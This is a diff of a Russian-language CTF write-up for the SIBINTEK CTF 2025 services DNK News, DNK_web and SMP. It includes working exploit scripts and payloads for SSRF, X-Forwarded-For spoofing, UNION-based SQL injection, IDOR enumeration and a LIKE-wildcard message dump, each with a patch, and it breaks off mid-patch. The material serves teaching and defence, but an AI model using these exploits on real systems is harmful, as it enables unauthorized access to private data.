@@ -1,65 +1,84 @@
-# 📄 Отчет по Уязвимостям Всего Райтапа (Vulnerability Report)
+# SIBINTEK CTF 2025 — WriteUps / Paths сервисов
 
-Этот файл содержит полную документацию по обнаруженным уязвимостям кодовой базы для создания эксплоитов.
+**Дата:** 21.11.2025
+
+> Документ восстановлен из Markdown, полученного автоматической конвертацией PDF. Исправлены смешанные колонки, кодовые блоки, списки и заголовки. Содержание сохранено по смыслу исходного writeup.
 
 ---
 
-## 📋 Обзор Уязвимостей
+# 1. DNK News
 
-### DNK News
+## Описание сервиса
 
-DNK News — веб-приложение на Flask для публикации корпоративных
-новостей и отчетов компании DNK.
+**DNK News** — веб-приложение на Flask для публикации корпоративных новостей и отчётов компании DNK.
+
 Основные функции:
-- Регистрация и аутентификация пользователей
-- Создание публичных и приватных новостей
-- Создание обычных и внутренних отчетов
-- Административная панель
-- REST API для доступа к данным
 
-#### Уязвимость #1: SSRF.
-Server-Side Request Forgery (SSRF) в эндпоинте /admin/health-check позволяет злоумышленнику заставить сервер выполнить HTTP-запросы к произвольным URL,
-включая внутренние сервисы.
-Местоположение:
-• Файл: src/service/routes/admin.py
-• Эндпоинт: GET /admin/health-check?url=<target>
-• Метод: health_check()
-Цель атаки:
-Прочитать приватные новости созданные чекером, которые может прочитать либо localhost, либо создатель новости.
+- регистрация и аутентификация пользователей;
+- создание публичных и приватных новостей;
+- создание обычных и внутренних отчётов;
+- административная панель;
+- REST API для доступа к данным.
 
-##### Уязвимый код:
+---
+
+## Уязвимость #1: SSRF
+
+### Описание
+
+Server-Side Request Forgery (SSRF) в эндпоинте `/admin/health-check` позволяет злоумышленнику заставить сервер выполнить HTTP-запрос к произвольному URL, включая внутренние сервисы.
+
+**Местоположение:**
+
+- файл: `src/service/routes/admin.py`;
+- эндпоинт: `GET /admin/health-check?url=<target>`;
+- метод: `health_check()`.
+
+**Цель атаки:** прочитать приватные новости, созданные чекером, которые доступны либо их создателю, либо запросам с localhost / внутренней сети.
+
+### Уязвимый код
+
 ```python
 @admin_bp.route('/health-check', methods=['GET', 'POST'])
 def health_check():
-    check_url = request.args.get('url') or request.form.get('url') or
-    (request.json.get('url') if request.is_json else None)
+    check_url = (
+        request.args.get('url')
+        or request.form.get('url')
+        or (request.json.get('url') if request.is_json else None)
+    )
+
     if not check_url:
         return jsonify({
             'status': 'healthy',
             'service': 'DNK News',
             'message': 'Use ?url=<service_url> to check dependencies'
         })
+
     try:
-        # УЯЗВИМОСТЬ: Нет валидации URL!
+        # УЯЗВИМОСТЬ: URL не валидируется.
         result = subprocess.run(
             ['curl', '-s', '-L', '--max-time', '5', check_url],
             capture_output=True,
             text=True,
             timeout=6
         )
+
         return jsonify({
             'status': 'success',
             'url': check_url,
-            'response': result.stdout, # Возвращает ответ от целевого URL
+            'response': result.stdout,
             'reachable': result.returncode == 0
         })
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        return jsonify({
+            'status': 'error',
+            'message': str(e)
+        }), 500
 ```
 
-##### Защита приватных новостей
+### Защита приватных новостей
 
-API эндпоинт `/api/news/<id>` проверяет IP клиента:
+Эндпоинт `/api/news/<id>` проверяет IP клиента. Приватная новость может быть прочитана с localhost или из внутренней сети.
 
 ```python
 @api_bp.route('/news/<int:news_id>', methods=['GET'])
@@ -68,7 +87,6 @@ def get_news_api(news_id):
 
     if news.is_private:
         client_ip = request.remote_addr
-
         is_localhost = client_ip in ['127.0.0.1', 'localhost', '::1']
         is_internal_network = client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
 
@@ -78,27 +96,24 @@ def get_news_api(news_id):
     return jsonify({...})
 ```
 
-##### Эксплуатация
+### Эксплуатация
 
-###### Шаг 1: Найти ID приватной новости
+#### Шаг 1. Зарегистрироваться и определить ID новости
 
 ```bash
-# Регистрируемся и логинимся
 curl -X POST http://target:3000/register \
   -d "username=hacker&password=pass123&email=hack@evil.com"
 
-# Смотрим список публичных новостей
 curl http://target:3000/api/news
 ```
 
-###### Шаг 2: Выполнить SSRF для получения приватной новости
+#### Шаг 2. Выполнить SSRF на внутренний API
 
 ```bash
-# SSRF на внутренний API эндпоинт
 curl "http://target:3000/admin/health-check?url=http://127.0.0.1:3000/api/news/5"
 ```
 
-###### Ответ
+Пример ответа:
 
 ```json
 {
@@ -109,45 +124,44 @@ curl "http://target:3000/admin/health-check?url=http://127.0.0.1:3000/api/news/5
 }
 ```
 
-##### Полный эксплоит
+### Полный эксплоит
 
 ```python
 #!/usr/bin/env python3
 
-import requests
 import json
+import requests
 import sys
 
 
 def exploit_ssrf(host, port, news_id):
     base_url = f"http://{host}:{port}"
 
-# Формируем SSRF payload
-target_url = f"http://127.0.0.1:3000/api/news/{news_id}"
+    target_url = f"http://127.0.0.1:3000/api/news/{news_id}"
 
-# Делаем запрос к health-check с SSRF payload
-response = requests.get(
-    f"{base_url}/admin/health-check",
-    params={"url": target_url},
-    timeout=10
-)
+    response = requests.get(
+        f"{base_url}/admin/health-check",
+        params={"url": target_url},
+        timeout=10,
+    )
 
-if response.status_code != 200:
-    print(f"[-] Ошибка SSRF: {response.status_code}")
+    if response.status_code != 200:
+        print(f"[-] Ошибка SSRF: {response.status_code}")
+        return None
+
+    data = response.json()
+    ssrf_response = data.get('response', '')
+
+    try:
+        news_data = json.loads(ssrf_response)
+        if 'content' in news_data:
+            print("[+] Успешно получена приватная новость!")
+            print(f"[+] FLAG: {news_data['content']}")
+            return news_data['content']
+    except Exception:
+        pass
+
     return None
-
-data = response.json()
-ssrf_response = data.get('response', '')
-
-# Парсим ответ от SSRF
-news_data = json.loads(ssrf_response)
-
-if 'content' in news_data:
-    print("[+] Успешно получена приватная новость!")
-    print(f"[+] FLAG: {news_data['content']}")
-    return news_data['content']
-
-return None
 
 
 if __name__ == "__main__":
@@ -157,15 +171,22 @@ if __name__ == "__main__":
     exploit_ssrf(host, port, news_id)
 ```
 
-##### Патч
+### Исправление
 
-Добавлена полная валидация URL:
+Добавлена валидация URL: разрешены только HTTP/HTTPS, запрещены localhost, loopback, link-local и приватные IP.
 
 ```python
+from urllib.parse import urlparse
+import ipaddress
+
+
 @admin_bp.route('/health-check', methods=['GET', 'POST'])
 def health_check():
-    check_url = request.args.get('url') or request.form.get('url') or \
-        (request.json.get('url') if request.is_json else None)
+    check_url = (
+        request.args.get('url')
+        or request.form.get('url')
+        or (request.json.get('url') if request.is_json else None)
+    )
 
     if not check_url:
         return jsonify({
@@ -174,86 +195,68 @@ def health_check():
             'message': 'Use ?url=<service_url> to check dependencies'
         })
 
-    # PATCH: Валидация URL для предотвращения SSRF
-    from urllib.parse import urlparse
-    import ipaddress
+    parsed = urlparse(check_url)
 
-    try:
-        parsed = urlparse(check_url)
-
-        # 1. Проверка протокола
-        if parsed.scheme not in ['http', 'https']:
-            return jsonify({
-                'status': 'error',
-                'message': 'Only HTTP/HTTPS protocols are allowed'
-            }), 400
-
-        # 2. Валидация hostname
-        hostname = parsed.hostname
-        if not hostname:
-            return jsonify({
-                'status': 'error',
-                'message': 'Invalid URL'
-            }), 400
-
-# 3. Блокировка localhost
-if hostname in ['localhost', '127.0.0.1', '0.0.0.0', '::1']:
-    return jsonify({
-        'status': 'error',
-        'message': 'Localhost access is forbidden'
-    }), 403
-
-# 4. Блокировка приватных IP адресов
-try:
-    ip = ipaddress.ip_address(hostname)
-
-    if ip.is_private or ip.is_loopback or ip.is_link_local:
+    if parsed.scheme not in ['http', 'https']:
         return jsonify({
             'status': 'error',
-            'message': 'Private IP access is forbidden'
+            'message': 'Only HTTP/HTTPS protocols are allowed'
+        }), 400
+
+    hostname = parsed.hostname
+    if not hostname:
+        return jsonify({
+            'status': 'error',
+            'message': 'Invalid URL'
+        }), 400
+
+    if hostname in ['localhost', '127.0.0.1', '0.0.0.0', '::1']:
+        return jsonify({
+            'status': 'error',
+            'message': 'Localhost access is forbidden'
         }), 403
 
-except ValueError:
-    # hostname - это доменное имя, не IP адрес
-    pass
+    try:
+        ip = ipaddress.ip_address(hostname)
+        if ip.is_private or ip.is_loopback or ip.is_link_local:
+            return jsonify({
+                'status': 'error',
+                'message': 'Private IP access is forbidden'
+            }), 403
+    except ValueError:
+        # hostname является доменным именем, а не IP-адресом.
+        pass
 
-# Теперь безопасно выполняем запрос
-result = subprocess.run(
-    ['curl', '-s', '-L', '--max-time', '5', check_url],
-    capture_output=True,
-    text=True,
-    timeout=6
-)
+    result = subprocess.run(
+        ['curl', '-s', '-L', '--max-time', '5', check_url],
+        capture_output=True,
+        text=True,
+        timeout=6,
+    )
 
-return jsonify({
-    'status': 'success',
-    'url': check_url,
-    'response': result.stdout,
-    'reachable': result.returncode == 0
-})
-
-except Exception as e:
     return jsonify({
-        'status': 'error',
-        'message': str(e)
-    }), 500
+        'status': 'success',
+        'url': check_url,
+        'response': result.stdout,
+        'reachable': result.returncode == 0,
+    })
 ```
 
-#### Уязвимость #2: X-Forwarded-For Manipulation
+---
 
-**X-Forwarded-For Header Manipulation** в эндпоинте `/api/reports/<id>` позволяет злоумышленнику подделать свой IP-адрес и получить доступ к чужим конфиденциальным отчетам.
+## Уязвимость #2: X-Forwarded-For Manipulation
 
-##### Местоположение
+### Описание
 
-* **Файл:** `src/service/routes/api.py`
-* **Эндпоинт:** `GET /api/reports/<id>`
-* **Метод:** `get_report_api()`
+Эндпоинт `/api/reports/<id>` доверяет заголовку `X-Forwarded-For`, который полностью контролируется клиентом. Злоумышленник может указать внутренний IP и получить доступ к `Report.confidential_data` чужих отчётов.
 
-##### Цель атаки
+**Местоположение:**
 
-Получить данные из `Report.confidential_data` чужих отчетов.
+- файл: `src/service/routes/api.py`;
+- эндпоинт: `GET /api/reports/<id>`;
+- метод: `get_report_api()`.
 
-##### Уязвимый код
+### Уязвимый код
 
 ```python
 @api_bp.route('/reports/<int:report_id>', methods=['GET'])
@@ -261,63 +264,42 @@ except Exception as e:
 def get_report_api(report_id):
     report = Report.query.get_or_404(report_id)
 
-    # УЯЗВИМОСТЬ: Доверяем заголовку X-Forwarded-For от клиента!
+    # УЯЗВИМОСТЬ: доверяем X-Forwarded-For от клиента.
     client_ip = request.headers.get('X-Forwarded-For')
 
-if not client_ip:
-    client_ip = request.remote_addr
-else:
-    # Берем первый IP из цепочки (может быть подделан!)
-    client_ip = client_ip.split(',')[0].strip()
+    if not client_ip:
+        client_ip = request.remote_addr
+    else:
+        # Первый IP в цепочке может быть подделан.
+        client_ip = client_ip.split(',')[0].strip()
 
-# Проверяем, является ли IP внутренним
-is_internal_ip = (
-    client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
-    or client_ip == '127.0.0.1'
-)
+    is_internal_ip = (
+        client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
+        or client_ip == '127.0.0.1'
+    )
 
-# Если IP не внутренний, проверяем авторство
-if not is_internal_ip:
-    if report.author_id != current_user.id:
-        return jsonify({
-            "error": "Access denied - not your report"
-        }), 403
+    if not is_internal_ip:
+        if report.author_id != current_user.id:
+            return jsonify({"error": "Access denied - not your report"}), 403
 
-# Для внутренних IP показываем confidential_data
-response_data = {...}
+    response_data = {...}
 
-if report.internal and is_internal_ip:
-    response_data["confidential_data"] = report.confidential_data  # ФЛАГ!
+    if report.internal and is_internal_ip:
+        response_data["confidential_data"] = report.confidential_data
 
-return jsonify(response_data)
+    return jsonify(response_data)
 ```
 
-##### Логика защиты
+Логика внутренней сети:
 
 ```python
 # config.py
 INTERNAL_NETWORK_PREFIX = '192.168.100.'
 ```
 
-```python
-# api.py
-is_internal_ip = (
-    client_ip.startswith('192.168.100.')
-    or client_ip == '127.0.0.1'
-)
+### Эксплуатация
 
-if not is_internal_ip:
-    # Если IP не внутренний, проверяем авторство
-    if report.author_id != current_user.id:
-        return jsonify({"error": "Access denied"}), 403
-else:
-    # Если IP внутренний — показываем ЛЮБОЙ отчет с флагами!
-    response_data["confidential_data"] = report.confidential_data
-```
-
-##### Эксплуатация
-
-###### Шаг 1: Регистрация пользователя
+#### Шаг 1. Регистрация
 
 ```bash
 curl -X POST http://target:3000/register \
@@ -325,15 +307,16 @@ curl -X POST http://target:3000/register \
   -c cookies.txt
 ```
 
-###### Шаг 2: Вход в систему
+#### Шаг 2. Вход
 
 ```bash
 curl -X POST http://target:3000/login \
   -d "username=hacker&password=pass123" \
-  -b cookies.txt -c cookies.txt
+  -b cookies.txt \
+  -c cookies.txt
 ```
 
-###### Шаг 3: Поддельный запрос с XFF
+#### Шаг 3. Поддельный X-Forwarded-For
 
 ```bash
 curl http://target:3000/api/reports/5 \
@@ -341,7 +324,7 @@ curl http://target:3000/api/reports/5 \
   -b cookies.txt
 ```
 
-###### Ответ
+Пример ответа:
 
 ```json
 {
@@ -354,12 +337,14 @@ curl http://target:3000/api/reports/5 \
 }
 ```
 
-##### Полный эксплоит
+### Полный эксплоит
 
 ```python
 #!/usr/bin/env python3
 
+import random
 import requests
+import string
 import sys
 
 
@@ -367,64 +352,51 @@ def exploit_xff(host, port, report_id, username=None, password=None):
     base_url = f"http://{host}:{port}"
     session = requests.Session()
 
-    # Если нет credentials - регистрируем нового пользователя
     if not username:
-        import random, string
-
         username = 'hacker_' + ''.join(
             random.choices(string.ascii_lowercase, k=8)
         )
-
         password = ''.join(
-            random.choices(
-                string.ascii_letters + string.digits,
-                k=12
-            )
+            random.choices(string.ascii_letters + string.digits, k=12)
         )
 
         register_data = {
             "username": username,
             "password": password,
-            "email": f"{username}@evil.com"
+            "email": f"{username}@evil.com",
         }
 
         session.post(
             f"{base_url}/register",
             data=register_data,
-            allow_redirects=False
+            allow_redirects=False,
         )
 
-        # Логинимся
-        login_data = {
-            "username": username,
-            "password": password
-        }
+    login_data = {"username": username, "password": password}
+    session.post(
+        f"{base_url}/login",
+        data=login_data,
+        allow_redirects=False,
+    )
 
-        session.post(
-            f"{base_url}/login",
-            data=login_data,
-            allow_redirects=False
-        )
-
-    # Эксплуатируем XFF для получения ЧУЖОГО отчета
     headers = {
         'X-Forwarded-For': '192.168.100.5'
-    }  # Подделываем IP!
+    }
 
     response = session.get(
         f"{base_url}/api/reports/{report_id}",
-        headers=headers
+        headers=headers,
     )
 
     if response.status_code == 200:
         data = response.json()
-
         if 'confidential_data' in data:
             print("[+] Успешно получены конфиденциальные данные!")
             print(f"[+] FLAG: {data['confidential_data']}")
             return data['confidential_data']
 
     return None
+
 
 if __name__ == "__main__":
     host = sys.argv[1]
@@ -433,36 +405,18 @@ if __name__ == "__main__":
     exploit_xff(host, port, report_id)
 ```
 
-##### Патч
+### Исправление
 
-Убрана зависимость от клиентского заголовка:
+Зависимость от клиентского `X-Forwarded-For` убрана. Для определения IP используется `request.remote_addr`.
 
 ```python
 @api_bp.route('/reports/<int:report_id>', methods=['GET'])
 @login_required
 def get_report_api(report_id):
-    """
-    PATCHED: Убрана возможность подделки IP через X-Forwarded-For
-
-    Теперь используется только реальный IP из
-    request.remote_addr
-    """
-
     report = Report.query.get_or_404(report_id)
 
-    # PATCH: Используем только реальный IP, игнорируем X-Forwarded-For
-    # X-Forwarded-For может быть подделан клиентом
+    # PATCH: игнорируем X-Forwarded-For, который может быть подделан.
     client_ip = request.remote_addr
-
-    # АЛЬТЕРНАТИВА: Если используется reverse proxy (nginx, cloudflare),
-    # можно доверять X-Forwarded-For только если запрос пришел
-    # от доверенного proxy:
-    #
-    # TRUSTED_PROXIES = ['10.0.0.1', '192.168.1.1']
-    # if request.remote_addr in TRUSTED_PROXIES:
-    #     forwarded_for = request.headers.get('X-Forwarded-For')
-    #     if forwarded_for:
-    #         client_ip = forwarded_for.split(',')[0].strip()
 
     is_internal_ip = (
         client_ip.startswith(Config.INTERNAL_NETWORK_PREFIX)
@@ -471,16 +425,14 @@ def get_report_api(report_id):
 
     if not is_internal_ip:
         if report.author_id != current_user.id:
-            return jsonify({
-                "error": "Access denied - not your report"
-            }), 403
+            return jsonify({"error": "Access denied - not your report"}), 403
 
     response_data = {
         "id": report.id,
         "title": report.title,
         "description": report.description,
         "internal": report.internal,
-        "created_at": report.created_at.isoformat()
+        "created_at": report.created_at.isoformat(),
     }
 
     if report.internal and is_internal_ip:
@@ -491,266 +443,266 @@ def get_report_api(report_id):
     return jsonify(response_data)
 ```
 
-### DWS
+Если приложение работает за reverse proxy, `X-Forwarded-For` можно использовать только когда сам запрос пришёл от доверенного прокси.
 
-#### Уязвимость #1: SQL Injection (SQLi)
+```python
+# TRUSTED_PROXIES = ['10.0.0.1', '192.168.1.1']
+# if request.remote_addr in TRUSTED_PROXIES:
+#     forwarded_for = request.headers.get('X-Forwarded-For')
+```
 
-##### Анализ уязвимости
+---
 
-В модуле работы с операциями (`backend/routes/operations.js`) была обнаружена критическая уязвимость SQL-инъекции.
+# 2. DNK_web
 
-Проблема кроется в небезопасном формировании SQL-запроса при фильтрации данных.
+## Описание сервиса
 
-Значение параметра `source_destination`, полученное от пользователя, напрямую подставляется в строку запроса без какой-либо предварительной обработки или экранирования.
+Разбор уязвимостей сервиса **DNK_web**. В исходном документе представлены уязвимости сервиса, способы их эксплуатации и варианты исправления.
 
-###### Уязвимый участок кода
+---
+
+## Уязвимость #1: SQL Injection (SQLi)
+
+### Анализ уязвимости
+
+Уязвимость находится в `backend/routes/operations.js`.
+
+Параметр `source_destination`, полученный от пользователя, напрямую подставляется в SQL-запрос без предварительного экранирования или параметризации.
+
+### Уязвимый участок кода
 
 ```javascript
 router.get('/', authenticateToken, async (req, res) => {
-    const { depot_id, source_destination } = req.query;
+  const { depot_id, source_destination } = req.query;
 
-    let query = `
-        SELECT o.*, u.username as operator_name
-        FROM operations o
-        LEFT JOIN "Users" u ON o.operator_id = u.id
-        WHERE 1=1
-    `;
+  let query = `
+    SELECT o.*, u.username as operator_name
+    FROM operations o
+    LEFT JOIN "Users" u ON o.operator_id = u.id
+    WHERE 1=1
+  `;
 
-    if (source_destination) {
-        query += ` AND o.source_destination LIKE '%${source_destination}%'`;
-    }
+  if (source_destination) {
+    query += ` AND o.source_destination LIKE '%${source_destination}%'`;
+  }
 
-    const [results] = await sequelize.query(query);
-    res.json(results);
+  const [results] = await sequelize.query(query);
+  res.json(results);
 });
 ```
 
-##### Эксплуатация
+### Эксплуатация
 
-Атакующий может использовать технику UNION-based SQL Injection для объединения результатов легитимного запроса с результатами произвольной выборки.
+Используется UNION-based SQL Injection. В исходном запросе ожидается 13 колонок: 12 колонок таблицы `operations` и одна колонка, получаемая через `JOIN`.
 
-Для успешной атаки необходимо определить количество колонок в исходном запросе. В таблице `operations` содержится 12 колонок, плюс одна колонка добавляется в результате JOIN-операции, итого 13 колонок.
-
-Пример эксплуатации с использованием `curl` для извлечения флагов:
+Пример запроса для извлечения данных из записей, содержащих флаг:
 
 ```bash
 curl "http://target:3001/api/operations?source_destination=' UNION SELECT id, operation_type, depot_id, tank_id, fuel_type, volume, timestamp, source_destination, transport_type, operator_id, notes, document_reference, NULL FROM operations WHERE notes LIKE 'FLAG%' --" \
   -H "Authorization: Bearer <token>"
 ```
 
-Для автоматизации процесса можно использовать скрипт на Python, который регистрирует пользователя, получает токен и выполняет инъекцию для выгрузки скрытых данных.
+Для автоматизации можно использовать Python-скрипт, который регистрирует пользователя, получает токен и выполняет инъекцию.
 
-##### Устранение уязвимости
+### Устранение уязвимости
 
-Для исправления необходимо отказаться от конкатенации строк при формировании SQL-запросов. Рекомендуется использовать возможности ORM Sequelize, которая автоматически экранирует параметры, либо применять параметризованные запросы (bind parameters).
-
-###### Исправленный код
+Необходимо отказаться от конкатенации SQL-строк. Следует использовать ORM Sequelize либо параметризованные запросы.
 
 ```javascript
 router.get('/', authenticateToken, async (req, res) => {
-    const { depot_id, source_destination, date_from, date_to } = req.query;
-    const where = {};
+  const {
+    depot_id,
+    source_destination,
+    date_from,
+    date_to,
+  } = req.query;
 
-    if (depot_id) {
-        where.depot_id = depot_id;
-    }
+  const where = {};
 
-    if (source_destination) {
-        where.source_destination = {
-            [Op.like]: `%${source_destination}%`
-        };
-    }
+  if (depot_id) {
+    where.depot_id = depot_id;
+  }
 
-    const operations = await Operation.findAll({
-        where,
-        include: [
-            { model: User, as: 'operator', attributes: ['username'] }
-        ],
-        order: [['timestamp', 'DESC']]
-    });
+  if (source_destination) {
+    where.source_destination = {
+      [Op.like]: `%${source_destination}%`,
+    };
+  }
 
-    res.json(operations);
+  const operations = await Operation.findAll({
+    where,
+    include: [
+      {
+        model: User,
+        as: 'operator',
+        attributes: ['username'],
+      },
+    ],
+    order: [['timestamp', 'DESC']],
+  });
+
+  res.json(operations);
 });
 ```
-#### Уязвимость #2: Insecure Direct Object Reference (IDOR)
 
-##### Анализ уязвимости
+---
 
-Вторая уязвимость обнаружена в модуле маршрутов (`backend/routes/routes.js`).
+## Уязвимость #2: Insecure Direct Object Reference (IDOR)
 
-Эндпоинт, отвечающий за получение GPS-координат рейса, проверяет только наличие валидного токена авторизации, но не проверяет права доступа конкретного пользователя к запрашиваемому ресурсу.
+### Анализ уязвимости
 
-Это позволяет любому авторизованному пользователю получить доступ к данным чужих рейсов, просто перебирая их идентификаторы.
+Уязвимость находится в `backend/routes/routes.js`.
 
-###### Уязвимый участок кода
+Эндпоинт получения GPS-координат рейса проверяет наличие валидного токена, но не проверяет, имеет ли текущий пользователь доступ к конкретному рейсу.
+
+Любой авторизованный пользователь может перебирать идентификаторы рейсов и читать чужие данные, включая содержимое поля `notes`.
+
+### Уязвимый участок кода
 
 ```javascript
 router.get('/:id/gps', authenticateToken, async (req, res) => {
-    const route = await Route.findByPk(req.params.id);
+  const route = await Route.findByPk(req.params.id);
 
-    if (!route) {
-        return res.status(404).json({ error: 'Route not found' });
+  if (!route) {
+    return res.status(404).json({ error: 'Route not found' });
+  }
+
+  let gps_data = [];
+
+  if (route.gps_coordinates) {
+    try {
+      gps_data = JSON.parse(route.gps_coordinates);
+    } catch (e) {
+      gps_data = [];
     }
+  }
 
-    let gps_data = [];
-    if (route.gps_coordinates) {
-        try {
-            gps_data = JSON.parse(route.gps_coordinates);
-        } catch (e) {
-            gps_data = [];
-        }
-    }
-
-    res.json({
-        route_id: route.id,
-        gps_data: gps_data,
-        notes: route.notes
-    });
+  res.json({
+    route_id: route.id,
+    gps_data: gps_data,
+    notes: route.notes,
+  });
 });
 ```
 
-##### Эксплуатация
+### Эксплуатация
 
-Атака сводится к перебору идентификаторов (`id`) в URL:
-
-`/api/routes/:id/gps`
-
-Поскольку сервер не проверяет принадлежность рейса текущему пользователю, злоумышленник может последовательно запрашивать данные для ID от 1 до N и анализировать ответы на наличие конфиденциальной информации, такой как флаги в поле заметок.
-
-###### Пример перебора
+Атака сводится к перебору `id` в `/api/routes/:id/gps`.
 
 ```bash
 for i in {1..100}; do
-    curl -s "http://target:3001/api/routes/$i/gps" \
-        -H "Authorization: Bearer $TOKEN"
+  curl -s "http://target:3001/api/routes/$i/gps" \
+    -H "Authorization: Bearer $TOKEN"
 done
 ```
 
-##### Устранение уязвимости
+### Устранение уязвимости
 
-Для защиты от IDOR необходимо внедрить проверку прав доступа на уровне бизнес-логики. Перед возвратом данных сервер должен убедиться, что запрашиваемый ресурс принадлежит текущему пользователю или что пользователь обладает соответствующими привилегиями (например, ролью администратора или диспетчера).
-
-###### Исправленный код
+Перед возвратом данных сервер должен проверить, принадлежит ли рейс текущему пользователю либо имеет ли пользователь привилегированную роль.
 
 ```javascript
 router.get('/:id/gps', authenticateToken, async (req, res) => {
-    const route = await Route.findByPk(req.params.id);
+  const route = await Route.findByPk(req.params.id);
 
-    if (!route) {
-        return res.status(404).json({ error: 'Route not found' });
+  if (!route) {
+    return res.status(404).json({ error: 'Route not found' });
+  }
+
+  const allowedRoles = ['admin', 'dispatcher'];
+  const isOwner = route.driver_id === req.user.id;
+  const hasPermission = allowedRoles.includes(req.user.role);
+
+  if (!isOwner && !hasPermission) {
+    return res.status(403).json({ error: 'Access denied' });
+  }
+
+  let gps_data = [];
+
+  if (route.gps_coordinates) {
+    try {
+      gps_data = JSON.parse(route.gps_coordinates);
+    } catch (e) {
+      gps_data = [];
     }
+  }
 
-    const allowedRoles = ['admin', 'dispatcher'];
-    const isOwner = route.driver_id === req.user.id;
-    const hasPermission = allowedRoles.includes(req.user.role);
-
-    if (!isOwner && !hasPermission) {
-        return res.status(403).json({ error: 'Access denied' });
-    }
-
-    let gps_data = [];
-    if (route.gps_coordinates) {
-        try {
-            gps_data = JSON.parse(route.gps_coordinates);
-        } catch (e) {
-            gps_data = [];
-        }
-    }
-    res.json({
-        route_id: route.id,
-        gps_data: gps_data,
-        notes: route.notes
-    });
+  res.json({
+    route_id: route.id,
+    gps_data: gps_data,
+    notes: route.notes,
+  });
 });
 ```
 
-### SMP
+---
 
-SMP (Space Mail Pigeons) — древнейший сервис для экстренной связи посредством
-голубиной почты, эволюционировал в улучшенную версию и теперь голуби могут
-летать в безвоздушном пространстве, а также стали отличаться умом и
-сообразительностью.
+# 3. SMP — Space Mail Pigeons
+
+## Описание сервиса
+
+**SMP (Space Mail Pigeons)** — сервис экстренной связи посредством голубиной почты. В улучшенной версии голуби могут летать в безвоздушном пространстве и используются для доставки сообщений между пользователями.
+
 Основные функции:
-- Регистрация и аутентификация пользователей
-- Создание голубей в голубятне
-- Отправка писем по username с помощью голубей
-- REST API для доступа к данным
 
-#### Уязвимость #1
+- регистрация и аутентификация пользователей;
+- создание голубей в голубятне;
+- отправка писем по `username` с помощью голубей;
+- REST API для доступа к данным.
 
-Сама уязвимость заключается в `LIKE` в запросе сообщений.
+---
 
-##### Решение
+## Уязвимость #1: wildcard в SQL LIKE
 
-Для исправления необходимо заменить `LIKE` на `=` в файле `src/api/messages.py` в функции `get_message`.
+### Описание
 
-Так как отправка сообщений всегда выдаёт точный `message_id`, использование `LIKE` избыточно и может быть заменено на `=`.
+При получении сообщений идентификатор `message_id` используется в запросе с оператором `LIKE`.
 
-###### Патч
+Если вместо точного идентификатора передать `%`, SQLite воспримет это как wildcard и вернёт все подходящие записи.
 
-```diff
-diff --git a/src/api/messages.rs b/src/api/messages.rs
-index 56a82a3..9132313 100644
---- a/src/api/messages.rs
-+++ b/src/api/messages.rs
-@@ -61,7 +61,7 @@ async fn get_message(
+### Уязвимый запрос
 
-    let message: Vec<Message> = sqlx::query_as(
-        "SELECT id, pigeon_id, sender_username, recipient_username,
-         subject, content, created_at
--        FROM messages WHERE id LIKE ?"
-+        FROM messages WHERE id = ?"
-    )
-    .bind(&message_data.message_id)
-    .fetch_all(&mut **db)
+```rust
+let message: Vec<Message> = sqlx::query_as(
+    "SELECT id, pigeon_id, sender_username, recipient_username, subject, content, created_at
+     FROM messages WHERE id LIKE ?"
+)
+.bind(&message_data.message_id)
+.fetch_all(&mut **db)
 ```
 
-##### Эксплуатация
+### Эксплуатация
 
-Запрашиваем сообщения, но вместо `message_id` подставляем `%` (знак нуля, одного или множества символов).
-
-###### Полный эксплоит
+Передаём `%` вместо `message_id`:
 
 ```python
 #!/usr/bin/env python3
 
-import sys
-import requests
 import re
+import requests
+import sys
 
 
 def exploit(host: str):
-    """Эксплойт для уязвимости LIKE в SQLite при получении сообщений"""
+    """Эксплойт для уязвимости LIKE в SQLite при получении сообщений."""
+
     try:
-        # Используем wildcard % для получения всех сообщений через
-        # уязвимость LIKE
+        response = requests.get(
+            f"http://{host}/api/messages",
+            params={"message_id": "%"},
+            timeout=5,
+        )
 
-        # В SQLite оператор LIKE с % позволяет получить все записи
-        try:
-            response = requests.get(
-                f"http://{host}/api/messages",
-                params={"message_id": "%"},
-                timeout=5
-            )
-            
-            if response.status_code == 200:
-                messages = response.json()
+        if response.status_code == 200:
+            messages = response.json()
+            flag_pattern = re.compile(r'[A-Z0-9]{31}=')
 
-                # Регулярное выражение для поиска флагов
-                # Формат флага обычно: [A-Z0-9]{31}= (32 символа с = на конце)
-                flag_pattern = re.compile(r'[A-Z0-9]{31}=')
+            for message in messages:
+                content = message.get('content', '')
+                flags = flag_pattern.findall(content)
 
-                for message in messages:
-                    content = message.get('content', '')
-
-                    flags = flag_pattern.findall(content)
-                    for flag in flags:
-                        print(flag, flush=True)
-
-        except Exception as e:
-            pass
-
-    except Exception as e:
+                for flag in flags:
+                    print(flag, flush=True)
+    except Exception:
         pass
 
 
@@ -760,247 +712,128 @@ if __name__ == "__main__":
 
     host = sys.argv[1]
     attack_data = sys.argv[2]
-
-    exploit(host, attack_data)
+    exploit(host)
 ```
 
-#### Уязвимость #2
+### Исправление
 
-Сама уязвимость заключается в отсутствии ключа шифрования cookie (заполнен нулями по умолчанию из-за разных потоков при инициализации и работе приложения).
-
-##### Решение
-
-Для исправления используем централизованный `State` из Rocket.
-
-###### Патч
+Так как при отправке сообщения всегда выдаётся точный `message_id`, использование `LIKE` не требуется. Его заменяют на `=`.
 
 ```diff
-diff --git a/src/api/auth.rs b/src/api/auth.rs
-index eaf6eef..2d6578f 100644
---- a/src/api/auth.rs
-+++ b/src/api/auth.rs
-@@ -1,14 +1,17 @@
- use crate::auth::generate_token;
- use crate::db::PigeonDb;
- use crate::models::{LoginRequest, LoginResponse, RegisterRequest, User};
-+use crate::AppState;
- use rocket::http::Status;
- use rocket::serde::json::Json;
-+use rocket::State;
- use rocket_db_pools::Connection;
+diff --git a/src/api/messages.rs b/src/api/messages.rs
+index 56a82a3..9132313 100644
+--- a/src/api/messages.rs
++++ b/src/api/messages.rs
+@@ -61,7 +61,7 @@ async fn get_message(
+     let message: Vec<Message> = sqlx::query_as(
+         "SELECT id, pigeon_id, sender_username, recipient_username,
+          subject, content, created_at
+-         FROM messages WHERE id LIKE ?"
++         FROM messages WHERE id = ?"
+     )
+     .bind(&message_data.message_id)
+     .fetch_all(&mut **db)
+```
 
-#[post("/register", data = "<user_data>")]
-async fn register(
-    mut db: Connection<PigeonDb>,
